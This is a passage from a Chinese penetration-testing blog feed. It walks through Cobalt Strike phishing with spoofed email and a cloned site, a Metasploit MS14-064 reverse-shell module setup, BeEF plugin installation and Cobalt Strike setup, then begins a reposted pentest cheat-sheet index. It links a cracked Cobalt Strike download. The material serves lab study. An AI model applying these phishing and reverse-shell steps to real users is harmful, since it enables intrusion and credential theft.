插件漏洞生成的一个克隆链接成功。</p>\n<p>现在我们进行邮件伪造。</p>\n<p>kali 下创建目标清单 targets.txt<br />\n 注意邮箱和姓名要用 TAB 键隔开，可以是多个邮件地址，每一行一个邮件地址。</p>\n<p><img data-src=\"image028.png\" alt=\"\" /></p>\n<p>创建一个钓鱼模板，可以直接下载一个 eml 文件来使用，这个最好还是逼真一点好。</p>\n<p>配置完毕</p>\n<p><img data-src=\"image029.png\" alt=\"\" /></p>\n<p>发送邮件</p>\n<p><img data-src=\"image030.png\" alt=\"\" /></p>\n<p>邮件发送成功，如果客户端存在 flash 漏洞，等待点击邮件模板里的链接即可跳转到我们的 http://192.168.199.145/search 地址，并通过 flash 漏洞，获取到该终端的权限，该终端会成功上线。</p>\n<p>注意：因为邮件服务器和 CS 服务器都是我在本地虚拟机搭建的，不在公网上的。所以暂时未模拟到真实邮件。</p>\n<h2 id=\"metasploit溢出代码与cobalt-strik配合钓鱼\"><a class=\"anchor\" href=\"#metasploit溢出代码与cobalt-strik配合钓鱼\">#</a> Metasploit 溢出代码与 Cobalt Strik 配合钓鱼</h2>\n<p>拿的是一个针对 XP 或者以下系统，利用 MS14_064 利用 IE 执行远控木马。 主要还是思路。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/windows/browser/ms14_064_ole_code_execution</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvhost <span class=\"token number\">192.168</span>.199.145</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> SRVPORT <span class=\"token number\">6666</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.199.139</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>exploit</pre></td></tr></table></figure><p>生成神秘代码！！</p>\n<p><img data-src=\"image031.png\" alt=\"\" /></p>\n<p>我们再克隆一下百度，放入 Attack</p>\n<p><img data-src=\"image032.png\" alt=\"\" /></p>\n<p>这里就不勾选键盘记录了，因为直接能控制对方了！</p>\n<p><img data-src=\"image033.png\" alt=\"\" /></p>\n<p>生成了网站链接，至于如何让目标访问这个网站，方法还是很多的，比如给目标来一个 ARP+DNS 欺骗，更改 DNS 解析包，强行让目标访问等。</p>\n<p>当目标一访问，这边就上线了。</p>\n<p><img data-src=\"image034.png\" alt=\"\" /></p>\n<p>不过这 IE 确实不行，我复现的这次 IE 直接裂开了……</p>\n<p><img data-src=\"image035.png\" alt=\"\" /></p>\n<p>网上找了个图，凑合着看吧。</p>\n<p><img data-src=\"image036.png\" alt=\"\" /></p>\n<p>通过控制，继续横向渗透即可！</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>总结下思路，就是各种模块之间的配合进行简单的钓鱼，知道这些思路后，还可以和别的钓鱼工具配合，或者是别的方法融合！</p>\n<h1 id=\"强化cobalt-strike\"><a class=\"anchor\" href=\"#强化cobalt-strike\">#</a> 强化 Cobalt strike</h1>\n<p>Cortana 是可以用于 Cobalt strike 以及 Armitage 的脚本，通过加载 cortana 可以向 Cobalt strike 中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制 cortana 脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。</p>\n<p>扩展：</p>\n<p>Aggressor Script 是 Cobalt Strike 3.0 版及更高版本中内置的脚本语言。Aggresor 脚本允许您修改和扩展 Cobalt Strike 客户端。</p>\n<p>Aggressor Script 是 Armitage 中开源脚本引擎 Cortana 的精神继任者。Cortana 是通过 DARPA 的 “网络快速通道” 计划的合同而成为可能的。Cortana 允许其用户通过 Armitage 的团队服务器扩展 Armitage 并控制 Metasploit 框架及其功能。Cobalt Strike 3.0 是对 Cobalt Strike（无 Armitage）基础的完全重写。这一更改提供了重新审视 Cobalt Strike 脚本并围绕 Cobalt Strike 功能构建内容的机会。这项工作的结果是 Aggressor Script。</p>\n<p>也就是说 Cobalt Strike 3.0 版本之后是 Aggressor。</p>\n<p>下载 cortana-scripts：</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvY29ydGFuYS1zY3JpcHRzLmdpdA==\">https://github.com/rsmudge/cortana-scripts.git</span></p>\n</blockquote>\n<h2 id=\"beef\"><a class=\"anchor\" href=\"#beef\">#</a> Beef</h2>\n<p>Beef 是一款针对浏览器的渗透测试工具，而 beef_strick 则是可以在 Cobalt strike 及 Armitage 中加载 Beef 的一个 Cortana 脚本，要使用此脚本，首先要先下载安装 msf 的 beef 插件。</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3hudHJpay9iZWVmbWV0YXNwbG9pdHBsdWdpbi5naXQ=\">https://github.com/xntrik/beefmetasploitplugin.git</span><br />\ncd beefmetasploitplugin<br />\ncp -R lib/* /usr/share/metasploit-framework/lib/<br />\ngem install hpricot<br />\ngem install json</p>\n</blockquote>\n<p>安装依赖库，执行：</p>\n<blockquote>\n<p>gem install hpricot<br />\ngem install json</p>\n</blockquote>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p>启动 msf 加载 beef</p>\n<blockquote>\n<p>msf6 &gt; load beef</p>\n</blockquote>\n<p>若遇到此问题</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>这样解决。</p>\n<blockquote>\n<p>cp -R /var/lib/gems/2.7.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby</p>\n</blockquote>\n<p><img data-src=\"image017.png\" alt=\"\" /></p>\n<p>这里注意若出现以下报错：</p>\n<p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>则要结合自己实际情况，例：查看 gems 目录下的文件名、hpricot-x.x.x。</p>\n<p>现在再启动 msf，就可以加载 beef 了</p>\n<p><img data-src=\"image019.png\" alt=\"\" /></p>\n<h2 id=\"cs免杀-mac写入内存\"><a class=\"anchor\" href=\"#cs免杀-mac写入内存\">#</a> CS 免杀 - MAC 写入内存</h2>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMTEyNzQ2OTk=\">https://blog.csdn.net/qq_34801745/article/details/111274699</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTY3NzAyNy9hcnRpY2xlL2RldGFpbHMvMTEwNzIyMzgy\">https://blog.csdn.net/weixin_39677027/article/details/110722382</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL3ppcmMwbi9lc2NiaGcvcXhnZm51\">https://www.yuque.com/zirc0n/escbhg/qxgfnu</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL2ludHJhbmV0L0NvYmFsdC1TdHJpa2UuaHRtbA==\">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNzcxNjkubmV0L2h0bWwvMjUzMjIxLmh0bWw=\">https://www.77169.net/html/253221.html</span></p>\n",
            "tags": [
                "CobaltStrike"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/",
            "url": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/",
            "title": "CobaltStrike的安装和配置",
            "date_published": "2021-07-06T08:58:41.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Cobalt Strike 是一款内网渗透测试工具，常被业界人称为 CS。Cobalt Strike 2.0 版本主要是结合 Metasploit 可以称为图形化 MSF 工具。而 Cobalt Strike 3.0 已经不再使用 Metasploit 框架而作为一个独立的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。客户端模式和服务端模式可以在 Windows 以及 Linux 上运行。<br />\nCobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等</p>\n<h1 id=\"安装cobaltstrike\"><a class=\"anchor\" href=\"#安装cobaltstrike\">#</a> 安装 CobaltStrike</h1>\n<p>有能力的可以支持一下正版 Cobalt Strike 官网: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbQ==\">https://www.cobaltstrike.com</span>。</p>\n<p>没有能力我们就用学 (po) 习 (jie) 版。</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWZiMXBTTmZGVWFjT2hxVlQ5b3BsaEE=\">https://pan.baidu.com/s/1fb1pSNfFUacOhqVT9oplhA</span><br />\n 提取码：rolr</p>\n<p>这个是 Linux 版本<br />\n下载解压后文件如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"目录结构\"><a class=\"anchor\" href=\"#目录结构\">#</a> 目录结构</h1>\n<pre><code>│  cobaltstrike.jar 【主体程序、客户端启动程序】\n│  teamserver  【Linux服务端启动程序(linux shell脚本)】\n|─third-party 第三方工具 【vnc远程功能的dll】\n|        README.vncdll.txt\n|        winvnc.x64.dll 【vnc服务端dllx64位】\n|        winvnc.x86.dll 【vnc服务端dllx86位】\n│  agscript 【拓展应用的脚本】\n│  c2lint  【检查c2配置文件的语法和预览】\n|  peclone 【用来解析dll】\n</code></pre>\n<h1 id=\"客户端与服务端的连接\"><a class=\"anchor\" href=\"#客户端与服务端的连接\">#</a> 客户端与服务端的连接</h1>\n<p>Cobalt Strike 使用 C/S 架构，Cobalt Strike 的客户端连接到团队服务器，团队服务器连接到目标，也就是说 Cobalt Strike 的客户端不与目标服务器进行交互。</p>\n<h2 id=\"启动服务端\"><a class=\"anchor\" href=\"#启动服务端\">#</a> 启动服务端</h2>\n<p>cobaltstrike.jar 既是服务端程序也是客户端程序，一般情况 Linux 用 teamserver 启动服务端。</p>\n<pre><code>teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]\n\n    &lt;host&gt; is the (default) IP address of this Cobalt Strike team server\n    &lt;password&gt; is the shared password to connect to this server\n    [/path/to/c2.profile] is your Malleable C2 profile\n    [YYYY-MM-DD] is a kill date for Beacon payloads run from this server\n</code></pre>\n<p>第一个参数为服务器监听 IP 地址 此选项为必填选项</p>\n<p>第二个参数为服务器连接密码客户端使用此密码连接服务器 此选项为必填选项</p>\n<p>第三个参数为 Malleable C2 profile 配置文件如果不使用可以不用填写 此选项为可选选项<br />\n这是开源的 Malleable C2 profile 文件<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvTWFsbGVhYmxlLUMyLVByb2ZpbGVz\"> https://github.com/rsmudge/Malleable-C2-Profiles</span></p>\n<p>第四个参数为 Beacon 有效负载运行结束日期。如果设置此选项则 CS 生成的每个 Beacon stage 中都将嵌入此结束日期，Beacon payload 在此日期后将拒绝运行，处于 sleep 状态的 Beacon payload 醒来后也将自动退出结束运行 此选项为可选选项</p>\n<p>例:<img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"启动客户端\"><a class=\"anchor\" href=\"#启动客户端\">#</a> 启动客户端</h2>\n<p>使用此命令可以直接运行</p>\n<p><code>java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>\n<p>为了方便我们把这句话保存在 <code>start.sh</code>  的 shell 脚本里面。</p>\n<p>当 Cobalt Strike 客户端启动时，你会看到一个连接对话框</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>输入主机 ip，连接端口 (默认 50050)，以及你想使用的用户名和服务端启动时设置的密码然后点击连接就可以连接到服务器了。</p>\n<p>点击 Connect 连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击 Yes，随后即可打开 CS 客户端界面</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>在连接后，团队之间就可以通过客户端进行沟通，信息共享。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n",
            "tags": [
                "CobaltStrike"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/Pentest_Note/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/Pentest_Note/",
            "title": "Pentest_Note[转载]",
            "date_published": "2021-05-12T11:41:18.000Z",
            "content_html": "<ul>\n<li>Author: 小 y</li>\n<li>公众号：关注安全技术<br />\n<img data-src=\"wechat.png\" alt=\"\" /></li>\n</ul>\n<h1 id=\"pentest_note\"><a class=\"anchor\" href=\"#pentest_note\">#</a> Pentest_Note</h1>\n<h2 id=\"转载请随意记得加from\"><a class=\"anchor\" href=\"#转载请随意记得加from\">#</a> 转载请随意，记得加 from</h2>\n<h2 id=\"声明1\"><a class=\"anchor\" href=\"#声明1\">#</a> 声明 1</h2>\n<pre><code>依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。\n</code></pre>\n<h2 id=\"声明2\"><a class=\"anchor\" href=\"#声明2\">#</a> 声明 2</h2>\n<pre><code>以下内容均在本地完成复现，不涉及任何非法行为，不允许使用本项目所提及的所有技术内容进行非法行为，使用技术的风险由使用者自行承担。\n</code></pre>\n<h1 id=\"目录\"><a class=\"anchor\" href=\"#目录\">#</a> 目录</h1>\n<ul>\n<li><a href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\">信息收集</a>\n<ul>\n<li><a href=\"#whois\">Whois</a></li>\n<li><a href=\"#%E7%BD%91%E7%AB%99ip\">网站 IP</a>\n<ul>\n<li><a href=\"#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8cdn\">是否存在 CDN</a></li>\n<li><a href=\"#bypass-cdn%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F\">Bypass cdn 常规方式</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%9F%9F%E5%90%8D%E5%8E%86%E5%8F%B2ip\">域名历史 IP</a></li>\n<li><a href=\"#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%87%E7%BA%B9cms%E8%AF%86%E5%88%AB%E5%AE%B9%E5%99%A8\">网站架构 / 服务器指纹 / CMS 识别 / 容器</a></li>\n<li><a href=\"#%E5%AD%90%E5%9F%9F%E5%90%8D\">子域名</a></li>\n<li><a href=\"#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84cms%E7%9A%84%E5%AE%98%E6%96%B9demo%E7%AB%99\">网站使用的 CMS 的官方 demo 站</a></li>\n<li><a href=\"#ssl%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF\">SSL 证书信息</a></li>\n<li><a href=\"#dns%E5%8E%86%E5%8F%B2%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95\">DNS 历史解析记录</a></li>\n<li><a href=\"#%E5%90%8C%E6%9C%8D%E7%AB%99%E7%82%B9%E6%83%85%E5%86%B5\">同服站点情况</a></li>\n<li><a href=\"#%E5%90%8C%E6%A0%B7%E6%9E%B6%E6%9E%84%E6%88%96%E6%BA%90%E7%A0%81%E7%9A%84%E7%AB%99\">同样架构或源码的站</a></li>\n<li><a href=\"#%E7%BD%91%E7%AB%99js\">网站 js</a></li>\n<li><a href=\"#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9js\">网站使用的第三方 js</a></li>\n<li><a href=\"#%E4%BA%91%E4%BF%A1%E6%81%AF\">云信息</a></li>\n<li><a href=\"#app%E5%8F%8D%E7%BC%96%E8%AF%91\">APP 反编译</a></li>\n<li><a href=\"#c%E6%AE%B5b%E6%AE%B5%E4%BF%A1%E6%81%AF\">C 段 / B 段信息</a></li>\n<li><a href=\"#%E5%B7%A5%E5%85%B7\">工具</a></li>\n<li><a href=\"#%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E6%83%85%E5%86%B5\">端口对外开放情况</a></li>\n<li><a href=\"#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%88%AC%E8%99%AB%E6%85%8E%E7%94%A8\">目录扫描 / 爬虫 (慎用)</a></li>\n<li><a href=\"#waf%E6%83%85%E5%86%B5%E8%AF%86%E5%88%AB\">WAF 情况识别</a></li>\n<li><a href=\"#%E9%9A%8F%E6%89%8B%E6%B5%8B%E8%AF%95\">随手测试</a></li>\n<li><a href=\"#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E\">搜索引擎</a></li>\n<li><a href=\"#shodanfofazoomeye\">Shodan/fofa/zoomeye</a></li>\n<li><a href=\"#google-dorks\">Google dorks</a></li>\n<li><a href=\"#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2\">信息泄露</a></li>\n<li><a href=\"#%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98\">网页缓存</a></li>\n<li><a href=\"#%E5%9B%BE%E7%89%87%E5%8F%8D%E6%9F%A5\">图片反查</a></li>\n<li><a href=\"#%E7%A4%BE%E4%BA%A4\">社交</a></li>\n<li><a href=\"#%E6%89%8B%E6%9C%BA%E5%8F%B7%E5%8A%A0%E5%85%A5%E9%80%9A%E8%AE%AF%E5%BD%95%E5%8C%B9%E9%85%8D%E5%90%84%E4%B8%AAapp%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF\">手机号加入通讯录匹配各个 APP 用户信息</a></li>\n<li><a href=\"#%E6%B3%A8%E5%86%8C%E8%BF%87%E7%9A%84%E7%BD%91%E7%AB%99\">注册过的网站</a></li>\n<li><a href=\"#%E7%9B%AE%E6%A0%87%E4%BA%BA%E5%91%98%E7%9A%84%E5%85%B4%E8%B6%A3\">目标人员的兴趣</a></li>\n<li><a href=\"#%E9%82%AE%E7%AE%B1%E6%90%9C%E9%9B%86\">邮箱搜集</a></li>\n<li><a href=\"#exchange\">Exchange</a></li>\n<li><a href=\"#%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8\">验证邮箱是否存在</a></li>\n<li><a href=\"#%E5%8E%86%E5%8F%B2%E6%B3%84%E9%9C%B2%E8%BF%87%E7%9A%84%E8%B5%84%E6%96%99%E7%AD%89\">历史泄露过的资料等</a></li>\n<li><a href=\"#githubgitee%E7%AD%89%E4%BB%A3%E7%A0%81%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0\">Github/Gitee 等代码托管平台</a></li>\n<li><a href=\"#%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%BD%91%E5%9D%80%E5%88%97%E8%A1%A8\">被入侵网址列表</a></li>\n<li><a href=\"#gps%E6%9F%A5%E8%AF%A2\">GPS 查询</a></li>\n<li><a href=\"#%E7%BD%91%E7%AB%99url%E6%8F%90%E5%8F%96\">网站 URL 提取</a></li>\n<li><a href=\"#%E8%9C%9C%E7%BD%90%E5%88%A4%E6%96%AD%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%E5%8D%B3%E5%8F%AF\">蜜罐判断 (参考一下即可)</a></li>\n<li><a href=\"#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81\">默认密码</a></li>\n<li><a href=\"#%E5%A6%82%E9%9C%80%E6%B3%A8%E5%86%8C\">如需注册</a></li>\n<li><a href=\"#%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF\">企业信息</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%85%A5%E5%8F%A3%E7%82%B9\">入口点</a>\n<ul>\n<li><a href=\"#win10-%E5%AE%89%E8%A3%85kaliwsl\">win10 安装 kali (wsl)</a></li>\n<li><a href=\"#%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB\">水坑攻击</a>\n<ul>\n<li><a href=\"#xss%E5%85%8B%E9%9A%86%E9%92%93%E9%B1%BC\">XSS 克隆钓鱼</a></li>\n<li><a href=\"#%E4%BC%AA%E9%80%A0%E9%A1%B5%E9%9D%A2%E9%92%93%E9%B1%BC\">伪造页面钓鱼</a>\n<ul>\n<li><a href=\"#1\">1</a></li>\n<li><a href=\"#2\">2</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E5%AF%B9%E5%A4%96%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB\">对外服务攻击</a>\n<ul>\n<li><a href=\"#web\">Web</a>\n<ul>\n<li><a href=\"#%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E\">前端 / 逻辑漏洞</a>\n<ul>\n<li><a href=\"#%E6%B3%A8%E5%86%8C\">注册</a></li>\n<li><a href=\"#%E7%99%BB%E5%BD%95\">登录</a></li>\n<li><a href=\"#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE\">任意密码重置</a></li>\n<li><a href=\"#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2\">信息泄露</a></li>\n<li><a href=\"#%E5%90%8E%E5%8F%B0\">后台</a></li>\n</ul>\n</li>\n<li><a href=\"#jwt%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95\">JWT 攻击手法</a>\n<ul>\n<li><a href=\"#%E6%9C%AA%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D\">未校验签名</a></li>\n<li><a href=\"#%E7%A6%81%E7%94%A8%E5%93%88%E5%B8%8C\">禁用哈希</a></li>\n<li><a href=\"#%E6%9A%B4%E7%A0%B4%E5%BC%B1%E5%AF%86%E9%92%A5\">暴破弱密钥</a></li>\n</ul>\n</li>\n<li><a href=\"#xss\">XSS</a></li>\n<li><a href=\"#csrf\">CSRF</a></li>\n<li><a href=\"#php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD\">php 任意文件读取 / 下载</a></li>\n<li><a href=\"#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\">php 文件包含</a>\n<ul>\n<li><a href=\"#%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE\">常用协议</a></li>\n<li><a href=\"#getshell\">Getshell</a>\n<ul>\n<li><a href=\"#allow_url_include-%E5%BC%80%E5%90%AF%E6%97%B6getshell\">allow_url_include 开启时 Getshell</a></li>\n<li><a href=\"#allow_url_include-%E5%85%B3%E9%97%AD%E6%97%B6getshell\">allow_url_include 关闭时 Getshell</a></li>\n<li><a href=\"#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell\">包含日志文件 getshell</a></li>\n<li><a href=\"#%E4%B8%8A%E4%BC%A0%E4%B8%AA%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB\">上传个图片格式的木马直接包含</a></li>\n<li><a href=\"#%E9%99%90%E5%88%B6%E5%90%8E%E7%BC%80%E6%97%B6\">限制后缀时</a></li>\n<li><a href=\"#phpinfo-lfi-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell\">phpinfo-LFI 本地文件包含临时文件 getshell</a></li>\n<li><a href=\"#session--lfi-getshell\">session + lfi getshell</a></li>\n<li><a href=\"#lfi-ssh-log\">LFI SSH Log</a></li>\n<li><a href=\"#rfi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BFmsf\">RFI &amp; 命令注入上线 MSF</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#xml\">XML</a>\n<ul>\n<li><a href=\"#xml%E6%B3%A8%E5%85%A5\">XML 注入</a></li>\n<li><a href=\"#xxe\">XXE</a>\n<ul>\n<li><a href=\"#%E5%88%A4%E6%96%AD\">判断</a></li>\n<li><a href=\"#%E6%8C%96%E6%8E%98\">挖掘</a></li>\n<li><a href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6\">有回显读取本地文件</a></li>\n<li><a href=\"#blind-oob-xxe%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96\">Blind OOB XXE 无回显读取</a></li>\n<li><a href=\"#%E5%88%97%E7%9B%AE%E5%BD%95\">列目录</a></li>\n<li><a href=\"#%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE\">不同平台支持的协议</a></li>\n<li><a href=\"#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\">执行命令</a></li>\n<li><a href=\"#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B\">内网主机探测</a></li>\n<li><a href=\"#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\">内网端口扫描</a></li>\n<li><a href=\"#%E5%86%85%E9%83%A8dtd%E5%88%A9%E7%94%A8\">内部 DTD 利用</a></li>\n<li><a href=\"#linux\">Linux</a></li>\n<li><a href=\"#windows\">Windows</a></li>\n<li><a href=\"#xxe%E5%86%99shell\">XXE 写 shell</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#ssrf\">SSRF</a>\n<ul>\n<li><a href=\"#%E5%AE%9A%E4%B9%89\">定义</a></li>\n<li><a href=\"#%E6%88%90%E5%9B%A0\">成因</a></li>\n<li><a href=\"#%E6%8C%96%E6%8E%98\">挖掘</a>\n<ul>\n<li><a href=\"#xml\">XML</a></li>\n<li><a href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93\">数据库</a></li>\n<li><a href=\"#mongodb\">MongoDB</a></li>\n<li><a href=\"#postgressql\">PostgresSQL</a></li>\n<li><a href=\"#mssql\">MSSQL</a></li>\n<li><a href=\"#%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0\">图片处理函数</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%94%BB%E5%87%BB\">攻击</a>\n<ul>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\">文件读取</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B\">端口探测</a>\n<ul>\n<li><a href=\"#ssrfredis\">SSRF+Redis</a></li>\n<li><a href=\"#302%E5%8F%8D%E5%BC%B9shell\">302 反弹 shell</a></li>\n<li><a href=\"#mysql\">Mysql</a></li>\n<li><a href=\"#weblogic-ssrfredis\">Weblogic SSRF+Redis</a></li>\n<li><a href=\"#ueditor-ssrf\">Ueditor SSRF</a></li>\n<li><a href=\"#discuz\">Discuz</a></li>\n<li><a href=\"#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA\">探测存活主机</a></li>\n<li><a href=\"#%E5%86%85%E5%A4%96%E7%BD%91%E8%B5%84%E4%BA%A7%E5%AF%B9%E5%BA%94\">内外网资产对应</a></li>\n<li><a href=\"#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95\">绕过方法</a></li>\n<li><a href=\"#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E6%8D%A2\">gopher 协议的脚本转换</a></li>\n<li><a href=\"#%E5%8D%8F%E8%AE%AE\">协议</a></li>\n<li><a href=\"#dict%E5%8D%8F%E8%AE%AE%E5%86%99shell\">dict 协议写 shell</a></li>\n<li><a href=\"#slaveof%E5%A4%8D%E5%88%B6shell%E5%88%B0%E7%9B%AE%E6%A0%87\">slaveof 复制 shell 到目标</a></li>\n<li><a href=\"#slaveof%E5%8F%8D%E5%BC%B9shell\">slaveof 反弹 shell</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#fuzz%E6%89%AB%E6%8F%8Fweb\">Fuzz / 扫描 web </a>\n<ul>\n<li><a href=\"#wfuzz\">WFuzz</a></li>\n<li><a href=\"#cewl\">Cewl</a></li>\n<li><a href=\"#dirsearch\">Dirsearch</a></li>\n</ul>\n</li>\n<li><a href=\"#bypass-waf\">Bypass WAF</a>\n<ul>\n<li><a 